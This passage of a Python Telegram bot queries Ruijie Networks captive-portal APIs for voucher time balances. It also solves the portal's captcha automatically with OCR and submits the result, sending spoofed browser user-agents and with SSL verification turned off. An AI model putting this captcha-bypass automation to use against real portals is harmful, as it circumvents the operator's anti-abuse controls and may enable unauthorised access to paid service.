                        user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
            except Exception as e:
                pass

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        if mins == 0:
            return "0m"
        hours = mins // 60
        rem_minutes = mins % 60
        if hours > 0 and rem_minutes > 0:
            return f"{hours}h {rem_minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{rem_minutes}m"
    except:
        return 'Unknown'

async def Code_Expires_Date(active_id):
    paths = [
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}'
    ]
    
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(
        connector=_connector,
        connector_owner=False,
        cookie_jar=aiohttp.CookieJar(),
        timeout=timeout
    ) as fresh_session:
        for url in paths:
            try:
                async with fresh_session.get(url, headers=headers) as req:
                    if req.status == 200:
                        respond = await req.json()
                        if respond.get('success'):
                            result = respond.get('result', {})
                            raw_minutes = result.get('totalMinutes')
                            if raw_minutes is None:
                                raw_minutes = result.get('remainingMinutes')
                            if raw_minutes is None:
                                raw_minutes = 'Unknown'
                                
                            profile_name = result.get('profileName', 'Unknown')
                            totaltime = Minute_to_Hour(raw_minutes)
                            display = f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
                            return display, raw_minutes
            except:
                continue
                
    return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        if data.get("success") == True:
            return session_id
        return None

# ==================== WEB SERVER ====================

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==================== MAIN ====================

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except Exception as e:
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    _connector = aiohttp.TCPConnector(
        limit=CONNECTION_LIMIT,
        limit_per_host=CONNECTION_PER_HOST,
        ttl_dns_cache=300,
        ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
